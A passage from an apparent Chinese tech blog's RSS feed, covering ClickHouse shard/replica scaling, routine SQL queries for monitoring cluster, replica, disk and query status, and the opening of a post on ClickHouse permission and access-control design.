 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;分片1
├─ 副本1 (node1) - 100% 数据，50% 读压力
└─ 副本2 (node2) - 100% 数据，50% 读压力

存储: 无增加 (2 × 100% = 200% 冗余)
读能力: 翻倍
写能力: 不变（需同步到所有副本）&lt;/code&gt;&lt;/pre&gt;&lt;h4 class="heading-element" id="1563-扩展方案-b增加分片应对存储写入压力"&gt;&lt;span&gt;15.6.3. 扩展方案 B：增加分片（应对存储/写入压力）&lt;/span&gt;
 &lt;a href="#1563-%e6%89%a9%e5%b1%95%e6%96%b9%e6%a1%88-b%e5%a2%9e%e5%8a%a0%e5%88%86%e7%89%87%e5%ba%94%e5%af%b9%e5%ad%98%e5%82%a8%e5%86%99%e5%85%a5%e5%8e%8b%e5%8a%9b" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;分片1 分片2
├─ 副本1 (node1) - 50% ├─ 副本1 (node3) - 50%
└─ 副本2 (node2) - 50% └─ 副本2 (node4) - 50%

存储: 翻倍 (每分片存一半)
读能力: 大幅提升（并行查询）
写能力: 翻倍（并行写入）&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="16-一些常用的sql"&gt;&lt;span&gt;16. 一些常用的sql&lt;/span&gt;
 &lt;a href="#16-%e4%b8%80%e4%ba%9b%e5%b8%b8%e7%94%a8%e7%9a%84sql" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;-- 查看集群状态
SELECT * FROM system.clusters;

-- 查看 Keeper 中的 ZK 路径数据
SELECT * FROM system.zookeeper;

-- 查看副本状态
SELECT * FROM system.replicas;

-- 查看同步队列状态
SELECT * FROM system.replication_queue;

-- 验证集群是否生效(在任意一台执行)
SELECT * FROM system.clusters WHERE cluster = &amp;#39;default_cluster&amp;#39;;

-- 集群拓扑
SELECT
 cluster,
 shard_num,
 replica_num,
 host_name,
 host_address,
 port
FROM system.clusters
ORDER BY shard_num, replica_num;

--当前节点身份（宏是否生效）
SELECT getMacro(&amp;#39;shard&amp;#39;) AS shard, getMacro(&amp;#39;replica&amp;#39;) AS replica;

--副本整体状态
--健康参考: 
--is_readonly = 0
--queue_size ≈ 0
--inserts_in_queue ≈ 0
SELECT database, table,is_leader,is_readonly,future_parts,parts_to_check,queue_size,inserts_in_queue FROM system.replicas;

--复制延迟 / 堆积详情
--判断是否存在副本 lag
--升级 / 扩容前必须检查

SELECT database,table,absolute_delay,log_max_index,log_pointer FROM system.replicas;

-- -- 强制修复常用命令
--使用建议: 
--1. 先 SYNC
--2. 再 RESTART
--3. 不要随便 DROP REPLICA

-- SYSTEM SYNC REPLICA db.table;
-- SYSTEM RESTART REPLICA db.table;



--磁盘状态
--用途: 
-- - 验证 hot / cold 是否加载
-- - 排查磁盘空间问题

SELECT name, path, free_space, total_space FROM system.disks;

-- 存储策略
SELECT * FROM system.storage_policies;

-- 表实际使用的磁盘
-- - 用途: 
-- - 验证 TTL 是否真的 move 到 cold
-- - 冷热分层是否生效
-- -- disk_name: 如果配置了多盘存储，这里会显示具体的物理盘别名（如 default, hdd, ssd）
-- -- count() AS parts: 正常情况下，一个表的 Part 数量不应过多（建议单表保持在几百个以内）。如果这个值过大，说明写入频率过高或合并（Merge）太慢。
-- readable_bytes: 反映了数据在磁盘上的实际物理占用（经过压缩后的）。
SELECT 
 database, 
 table, 
 disk_name, 
 count() AS parts, 
 formatReadableSize(sum(bytes_on_disk)) AS readable_bytes
FROM system.parts 
WHERE active -- 只统计活跃的分区，排除正在合并或过期的
GROUP BY database, table, disk_name 
ORDER BY sum(bytes_on_disk) DESC;

-- -- 监控合并队列 查看后台合并任务是否卡住
-- SELECT * FROM system.merges;


--当前正在执行的查询
SELECT query_id,user,elapsed,memory_usage,query FROM system.processes;


-- 最近慢查询
SELECT
 query_duration_ms,
 read_rows,
 result_rows,
 query
FROM system.query_log
ORDER BY query_duration_ms DESC
LIMIT 10;

--数据库级容量
SELECT
 database,
 sum(bytes_on_disk) AS size
FROM system.parts
WHERE active
GROUP BY database
ORDER BY size DESC;


-- 1. 检查集群配置是否正确(新节点)
SELECT 
 cluster,
 shard_num,
 replica_num,
 host_name,
 host_address,
 port
FROM system.clusters 
WHERE cluster = &amp;#39;default_cluster&amp;#39;
ORDER BY shard_num, replica_num;
-- 期望结果：
-- default_cluster | 1 | 1 | 172.31.10.12 | ...
-- default_cluster | 1 | 2 | 172.31.10.12 | ...
-- 注意：shard_num 必须都是 1（同一个分片） 


-- 查看 SQL 执行错误时候的具体报错
SELECT 
 event_time, 
 query, 
 exception_code, 
 exception, -- 具体的错误简述
 stack_trace -- 详细的错误堆栈
FROM system.query_log 
WHERE type != &amp;#39;QueryFinish&amp;#39; -- 过滤掉成功的查询
AND type != &amp;#39;QueryStart&amp;#39;
AND event_time &amp;gt; now() - INTERVAL 1 HOUR -- 查看最近一小时
ORDER BY event_time DESC 
LIMIT 10;&lt;/code&gt;&lt;/pre&gt;</description></item><item><title>clickhouse权限与访问控制设计</title><link>https://blog.0x5c0f.cc/posts/linux/clickhouse%E6%9D%83%E9%99%90%E4%B8%8E%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E8%AE%BE%E8%AE%A1/</link><pubDate>Wed, 17 Dec 2025 00:00:00 +0000</pubDate><author>mail@0x5c0f.cc (0x5c0f)</author><guid>https://blog.0x5c0f.cc/posts/linux/clickhouse%E6%9D%83%E9%99%90%E4%B8%8E%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E8%AE%BE%E8%AE%A1/</guid><category domain="https://blog.0x5c0f.cc/categories/linux/">Linux</category><category domain="https://blog.0x5c0f.cc/categories/%E8%BF%90%E7%BB%B4%E8%AE%B0%E4%BA%8B/">运维记事</category><description>&lt;div class="details admonition info open"&gt;
 &lt;div class="details-summary admonition-title"&gt;&lt;i class="icon fa-fw fa-solid fa-circle-info" aria-hidden="true"&gt;&lt;/i&gt;信息&lt;i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"&gt;&lt;/i&gt;&lt;/div&gt;
 &lt;div class="details-content"&gt;
 &lt;div class="admonition-content"&gt;&lt;p&gt;当前测试环境:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;主节点: &lt;code&gt;Ubuntu 24.04&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;从节点: &lt;code&gt;Debian 13&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ClickHouse server&lt;/code&gt;: &lt;code&gt;25.11.2.24 (official build)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;
 &lt;/div&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;适用版本：ClickHouse 23+ / 25.x&lt;br&gt;
适用场景：生产集群、多数据库、多团队、长期演进&lt;br&gt;
非目标：OLTP 事务级权限模型&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h1 class="heading-element" id="1-clickhouse-权限设计的工程背景"&gt;&lt;span&gt;1. ClickHouse 权限设计的工程背景&lt;/span&gt;
 &lt;a href="#1-clickhouse-%e6%9d%83%e9%99%90%e8%ae%be%e8%ae%a1%e7%9a%84%e5%b7%a5%e7%a8%8b%e8%83%8c%e6%99%af" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h1&gt;&lt;h2 class="heading-element" id="11-clickhouse-的定位决定了一切"&gt;&lt;span&gt;1.1 ClickHouse 的定位决定了一切&lt;/span&gt;
 &lt;a href="#11-clickhouse-%e7%9a%84%e5%ae%9a%e4%bd%8d%e5%86%b3%e5%ae%9a%e4%ba%86%e4%b8%80%e5%88%87" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
 &lt;th&gt;数据库&lt;/th&gt;
 &lt;th&gt;设计目标&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;MySQL&lt;/code&gt; / &lt;code&gt;PostgreSQL&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;OLTP（事务系统）&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;ClickHouse&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;OLAP（分析系统）&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;这意味着：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ClickHouse&lt;/code&gt; &lt;strong&gt;不是为频繁 UPDATE / DELETE 设计的&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ClickHouse&lt;/code&gt; 的“安全边界”更多在 &lt;strong&gt;结构、资源、复制层面&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h1 class="heading-element" id="2-集群keeper-与权限的真实关系"&gt;&lt;span&gt;2. 集群、Keeper 与权限的真实关系&lt;/span&gt;
 &lt;a href="#2-%e9%9b%86%e7%be%a4keeper-%e4%b8%8e%e6%9d%83%e9%99%90%e7%9a%84%e7%9c%9f%e5%ae%9e%e5%85%b3%e7%b3%bb" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h1&gt;&lt;h2 class="heading-element" id="21-on-cluster-的真实含义"&gt;&lt;span&gt;2.1 ON CLUSTER 的真实含义&lt;/span&gt;
 &lt;a href="#21-on-cluster-%e7%9a%84%e7%9c%9f%e5%ae%9e%e5%90%ab%e4%b9%89" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;CREATE DATABASE dbtest ON CLUSTER default_cluster;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;ON CLUSTER 只意味着：&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
 &lt;th&gt;能力&lt;/th&gt;
 &lt;th&gt;是否&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
 &lt;td&gt;当前集群节点执行 DDL&lt;/td&gt;
 &lt;td&gt;✅&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;新节点加入后自动存在&lt;/td&gt;
 &lt;td&gt;❌&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;元数据持续复制&lt;/td&gt;
 &lt;td&gt;❌&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;ON CLUSTER&lt;/code&gt; 是“广播执行”，不是“持续复制”&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;所有已配置的节点必须在线，否则 &lt;code&gt;ON CLUSTER&lt;/code&gt; 执行时会等待所有节点完成，从而导致执行失败&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 class="heading-element" id="22-keeper-对权限的影响"&gt;&lt;span&gt;2.2 Keeper 对权限的影响&lt;/span&gt;
 &lt;a href="#22-keeper-%e5%af%b9%e6%9d%83%e9%99%90%e7%9a%84%e5%bd%b1%e5%93%8d" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;&lt;code&gt;Keeper&lt;/code&gt; 负责：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;分布式 &lt;code&gt;DDL&lt;/code&gt; 协调&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Replicated&lt;/code&gt; 表元数据&lt;/li&gt;
&lt;li&gt;副本状态&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;因此：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;没有 &lt;code&gt;Keeper&lt;/code&gt;，&lt;code&gt;ON CLUSTER&lt;/code&gt; 权限 / DDL &lt;strong&gt;不可用&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;部分权限（&lt;code&gt;SYSTEM&lt;/code&gt; / &lt;code&gt;DDL&lt;/code&gt;）&lt;strong&gt;隐含依赖 Keeper&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h1 class="heading-element" id="3-数据库是权限隔离的最小单元"&gt;&lt;span&gt;3. 数据库是权限隔离的最小单元&lt;/span&gt;
 &lt;a href="#3-%e6%95%b0%e6%8d%ae%e5%ba%93%e6%98%af%e6%9d%83%e9%99%90%e9%9a%94%e7%a6%bb%e7%9a%84%e6%9c%80%e5%b0%8f%e5%8d%95%e5%85%83" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h1&gt;&lt;h2 class="heading-element" id="31-为什么禁止使用-default-数据库"&gt;&lt;span&gt;3.1 为什么禁止使用 &lt;code&gt;default&lt;/code&gt; 数据库？&lt;/span&gt;
 &lt;a href="#31-%e4%b8%ba%e4%bb%80%e4%b9%88%e7%a6%81%e6%ad%a2%e4%bd%bf%e7%94%a8-default-%e6%95%b0%e6%8d%ae%e5%ba%93" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;所有用户天然可见&lt;/li&gt;
&lt;li&gt;权限边界模糊&lt;/li&gt;
&lt;li&gt;容易被误用&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;📌 &lt;strong&gt;规范要求：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;default 数据库只允许运维访问&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h2 class="heading-element" id="32-一个-clickhouse-server-应该有多少数据库"&gt;&lt;span&gt;3.2 一个 clickhouse-server 应该有多少数据库？&lt;/span&gt;
 &lt;a href="#32-%e4%b8%80%e4%b8%aa-clickhouse-server-%e5%ba%94%e8%af%a5%e6%9c%89%e5%a4%9a%e5%b0%91%e6%95%b0%e6%8d%ae%e5%ba%93" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;原则：一个业务 / 团队 = 一个数据库&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这是后续权限、审计、迁移的基础。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 class="heading-element" id="4-数据库创建规范"&gt;&lt;span&gt;4. 数据库创建规范&lt;/span&gt;
 &lt;a href="#4-%e6%95%b0%e6%8d%ae%e5%ba%93%e5%88%9b%e5%bb%ba%e8%a7%84%e8%8c%83" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h1&gt;&lt;h2 class="heading-element" id="41-两种数据库模式必须明确区分"&gt;&lt;span&gt;4.1 两种数据库模式必须明确区分&lt;/span&gt;
 &lt;a href="#41-%e4%b8%a4%e7%a7%8d%e6%95%b0%e6%8d%ae%e5%ba%93%e6%a8%a1%e5%bc%8f%e5%bf%85%e9%a1%bb%e6%98%8e%e7%a1%ae%e5%8c%ba%e5%88%86" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;h2 class="heading-element" id="模式一atomic-database非持续复制"&gt;&lt;span&gt;模式一：Atomic Database（非持续复制）&lt;/span&gt;
 &lt;a href="#%e6%a8%a1%e5%bc%8f%e4%b8%80atomic-database%e9%9d%9e%e6%8c%81%e7%bb%ad%e5%a4%8d%e5%88%b6" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
